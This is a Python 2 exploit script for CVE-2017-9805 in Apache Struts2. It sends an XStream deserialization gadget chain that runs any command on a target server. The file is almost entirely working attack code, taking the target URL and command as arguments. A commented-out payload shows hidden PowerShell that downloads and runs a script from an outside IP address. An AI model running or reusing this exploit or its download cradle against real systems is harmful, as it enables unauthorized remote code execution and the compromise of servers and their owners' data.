#! /usr/bin/env python
# encoding:utf8
import sys
import requests

"""

  CVE-2017-9805 
  Struts2在使用带有 XStream 处理程序的 Struts REST 插件，处理 XML 有效负载时，可能发生远程代码执行攻击
  Struts 2.5 - Struts 2.5.12 

"""


if len(sys.argv) != 3:
  print """
   ____ ____         ___ ____ ____  
  / ___|___ \       / _ \| ___|___ \ 
  \___ \ __)  |____| | | |___ \ __) |
   ___)  / __/_____| |_| |___) / __/ 
  |____/_____|     \___/|____/_____|"""
  print ""
  print "[==>] python st2-052.py url command"
  exit(1)

header = {
    "Content-Length" : "155",
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Content-Type" : "application/xml"
}

#payload = '<string>powershell.exe</string><string>-nop</string><string>-w</string><string>hidden</string><string>-c</string><string>"IEX ((new-object net.webclient).downloadstring('http://43.245.223.175:809/a'))"</string>'

payload = sys.argv[2]

payload = payload.replace(' ','</string><string>')

data = """
    <map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>{0}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>""".format(payload)


def exp(url):

  try:
    r = requests.post(url, data=data, headers=header, timeout=12)
    print "\n[+] {0} -> [{1}]".format(r.url, r.status_code)
  except:
    print  "[x] Request is error!"


if __name__ == '__main__':
  exp(sys.argv[1])